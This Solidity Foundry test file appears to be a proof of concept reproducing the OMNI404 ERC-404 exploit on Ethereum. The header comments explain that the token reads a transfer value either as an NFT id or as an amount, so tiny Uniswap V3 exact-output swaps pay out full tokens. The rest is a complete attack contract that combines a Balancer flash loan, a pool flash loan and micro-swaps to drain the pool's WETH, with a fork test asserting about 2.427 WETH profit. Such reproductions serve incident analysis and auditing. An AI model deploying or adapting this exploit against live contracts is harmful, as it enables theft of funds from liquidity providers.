// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";

// OMNI404 (O404) - ERC-404 ID/amount dual-interpretation vs Uniswap V3 exact-output swaps - Ethereum.
// Attacker net gain 2.427 WETH in the run() tx (2.427003380901677080).
//
// Attack tx (run): 0x4cbc3d8db832eb5442ce1c11d79fda05cafabfe7906933ed25881d60bf41d6f3 (block 25951648)
// Attacker EOA   : 0xFB26db4EAb18Cb50d29Ff431888dD643A7e9C9f8
// Exploit (on-chain): 0x505B2EBea0EC6e30D02768f1de8DdE8Dd9122aD4
// O404 token     : 0xd5C02bB3e40494D4674778306Da43a56138A383E  (verified; OMNI404 is ERC-404, maxTotalSupplyERC721=50)
// Pool           : 0xB3f613b9Bc84ddB29D78fA4685b01d98412BBa0b  (Uniswap V3, token0=WETH, token1=O404, whitelisted in O404)
// Balancer Vault : 0xBA12222222228d8Ba445958a75a0704d566BF2C8
// WETH           : 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2
//
// ROOT CAUSE - which of the two circulating framings is correct, decided from the verified source + trace:
//   The operative bug is the dual ID/amount interpretation (the SlowMist framing, "B"), NOT an independent
//   floor-rounding round-trip leak (the community framing, "A"). From O404.transfer() (verified source):
//       function transfer(address to_, uint256 valueOrId_) {
//           if (valueOrId_ <= maxTotalSupplyERC721) {        // maxTotalSupplyERC721 == 50
//               // treated as an ERC-721 id: moves 1*units (1e18) ERC-20 AND the NFT
//               require(msg.sender == _ownerOf[id]);
//               _transferERC20(msg.sender, to_, units);       // <-- a FULL 1e18 regardless of the "value"
//               _transferERC721(msg.sender, to_, id);
//           } else { ...normal ERC-20 value transfer... }
//       }
//   A Uniswap V3 exact-output swap makes the pool send the output via token.transfer(recipient, amountOut).
//   When amountOut is a tiny wei value <= 50, O404 interprets it as "transfer NFT #amountOut" and pays out a
//   full 1e18 units (plus the NFT), while the pool's swap math only debits `amountOut` WEI. So the attacker
//   buys 1e18 O404 for ~2 wei of WETH per micro-swap. The require(msg.sender == _ownerOf[id]) means the POOL
//   must own the low ids first - which is arranged with a Uniswap V3 flash() of the ERC-20 (below).
//   Framing A is right about the setup (ERC-404 + whitelisted pool; the borrow really does mint 6 fresh NFTs,
//   minted 15 -> 21) and its "~65 loops" is just the count of micro-swaps, but its stated mechanism
//   (sub-unit floor rounding leaking per round-trip) is not what extracts the value; the ID/amount confusion is.
//
// Mechanism per cycle (run() repeats this 3x, after an initial 0.2 O404 buy, then a final 0.2 sell):
//   a) pool.flash(0, 20e18): borrow 20 O404. pool is whitelisted (no burn); this contract is not, so the
//      floor(balance/units) reconciliation MINTS ~20 NFTs (ids 1..21) to this contract from the stored bank.
//   b) repay the flash with ID-path transfers transfer(pool, id) for each owned id: each sends 1e18 + NFT,
//      so the principal is returned AND the pool is left OWNING low NFT ids 1..21.
//   c) buy-loop: for each id the pool now owns, swap exact-output of `id` wei. The pool's transfer(this, id)
//      hits the ID-path and pays out 1e18 O404 + the NFT for ~2 wei WETH. ~20 units reclaimed almost free.
//   d) sell the ~20 O404 back to the pool for real WETH. The pool's WETH reserve is what is drained.
//
// Profit reconciliation: run() alone nets 2.427003380901677080 WETH (SlowMist's "2.4 WETH"). The full incident
// was 4 txs (deploy, run +2.427, then three drain() calls +0.367/+0.147/+0.079) ~= 3.02 ETH (the community
// figure). This PoC reproduces run() in one pass and asserts against ~2.427 WETH.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
}

interface IWETH is IERC20 {
    function withdraw(uint256) external;
}

interface IO404 {
    function transfer(address to, uint256 valueOrId) external returns (bool);
    function balanceOf(address) external view returns (uint256);
    function ownerOf(uint256 id) external view returns (address);
    function minted() external view returns (uint256);
}

interface IBalancerVault {
    function flashLoan(address recipient, address[] calldata tokens, uint256[] calldata amounts, bytes calldata userData)
        external;
}

interface IUniswapV3Pool {
    function swap(address recipient, bool zeroForOne, int256 amountSpecified, uint160 sqrtPriceLimitX96, bytes calldata data)
        external
        returns (int256 amount0, int256 amount1);
    function flash(address recipient, uint256 amount0, uint256 amount1, bytes calldata data) external;
}

contract OMNI404Exploit {
    IWETH constant WETH = IWETH(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IO404 constant O404 = IO404(0xd5C02bB3e40494D4674778306Da43a56138A383E);
    IUniswapV3Pool constant POOL = IUniswapV3Pool(0xB3f613b9Bc84ddB29D78fA4685b01d98412BBa0b);
    IBalancerVault constant VAULT = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);

    uint160 constant MIN_SQRT = 4295128741; // price-down limit (buying O404, zeroForOne=true)
    uint160 constant MAX_SQRT = 1461446703485210103287273052203988822378723970340; // price-up limit (selling O404)

    uint256 constant FLASH_WETH = 5 ether;
    uint256 constant BORROW_O404 = 20e18; // O404 flash-borrowed from the pool each cycle
    uint256 constant MAX_ID = 50; // O404.maxTotalSupplyERC721
    uint256 constant CYCLES = 3;

    address public immutable owner;

    constructor() {
        owner = msg.sender;
    }

    function attack() external {
        address[] memory tokens = new address[](1);
        tokens[0] = address(WETH);
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = FLASH_WETH;
        VAULT.flashLoan(address(this), tokens, amounts, "");
        // Forward profit to caller.
        payable(owner).transfer(address(this).balance);
    }

    // ---- Balancer flash-loan callback ----
    function receiveFlashLoan(address[] calldata, uint256[] calldata amounts, uint256[] calldata, bytes calldata) external {
        require(msg.sender == address(VAULT), "not vault");

        // Seed a 0.2 O404 fractional position (covers the V3 flash fee each cycle).
        POOL.swap(address(this), true, -0.2e18, MIN_SQRT, "");

        for (uint256 c = 0; c < CYCLES; c++) {
            // (a)+(b): borrow 20 O404 (mints NFTs here), repaid inside uniswapV3FlashCallback via ID-path.
            POOL.flash(address(this), 0, BORROW_O404, "");

            // (c): reclaim each NFT the pool now owns via a tiny exact-output swap -> 1e18 O404 each, ~free.
            uint256 hi = O404.minted();
            for (uint256 id = 1; id <= hi; id++) {
                if (O404.ownerOf(id) == address(POOL)) {
                    POOL.swap(address(this), true, -int256(id), MIN_SQRT, "");
                }
            }

            // (d): dump the reclaimed O404 back into the pool for WETH.
            POOL.swap(address(this), false, 19.8e18, MAX_SQRT, "");
        }

        // Sell the leftover fractional.
        POOL.swap(address(this), false, 0.2e18, MAX_SQRT, "");

        // Repay the Balancer flash loan (zero fee).
        WETH.transfer(address(VAULT), amounts[0]);

        // Unwrap the WETH surplus to native ETH.
        WETH.withdraw(WETH.balanceOf(address(this)));
    }

    // ---- Uniswap V3 flash callback: repay the 20 O404 + fee using ID-path transfers ----
    // Each transfer(pool, id) with id<=50 sends 1e18 O404 + NFT #id, leaving the pool owning the low ids.
    function uniswapV3FlashCallback(uint256, uint256, bytes calldata) external {
        require(msg.sender == address(POOL), "not pool");
        uint256 hi = O404.minted();
        for (uint256 id = 1; id <= hi; id++) {
            if (O404.ownerOf(id) == address(this)) {
                O404.transfer(address(POOL), id); // ID-path: 1e18 + NFT each
            }
        }
        // Return the remaining fractional to cover principal rounding + fee.
        O404.transfer(address(POOL), O404.balanceOf(address(this)));
    }

    // ---- Uniswap V3 swap callback: pay whichever token is owed (token0=WETH, token1=O404) ----
    function uniswapV3SwapCallback(int256 amount0Delta, int256 amount1Delta, bytes calldata) external {
        require(msg.sender == address(POOL), "not pool");
        if (amount0Delta > 0) WETH.transfer(address(POOL), uint256(amount0Delta));
        if (amount1Delta > 0) O404.transfer(address(POOL), uint256(amount1Delta));
    }

    receive() external payable {}
}

contract OMNI404_exp is Test {
    IERC20 constant WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IO404 constant O404 = IO404(0xd5C02bB3e40494D4674778306Da43a56138A383E);
    address constant POOL = 0xB3f613b9Bc84ddB29D78fA4685b01d98412BBa0b;

    function testExploit() public {
        vm.createSelectFork("mainnet", 25951647); // parent block of the exploit tx

        emit log_named_decimal_uint("pool WETH before", WETH.balanceOf(POOL), 18);
        emit log_named_uint("O404 minted before", O404.minted());

        OMNI404Exploit exploit = new OMNI404Exploit();
        uint256 balBefore = address(this).balance;

        exploit.attack();

        uint256 profit = address(this).balance - balBefore;
        emit log_named_decimal_uint("pool WETH after ", WETH.balanceOf(POOL), 18);
        emit log_named_uint("O404 minted after ", O404.minted());
        emit log_named_decimal_uint("attacker ETH profit", profit, 18);

        // Matches the on-chain run() gain of 2.427003380901677080 WETH (SlowMist's "2.4 WETH").
        assertApproxEqRel(profit, 2.427003380901677080 ether, 0.02e18, "profit off expected ~2.427 WETH");
    }

    receive() external payable {}
}
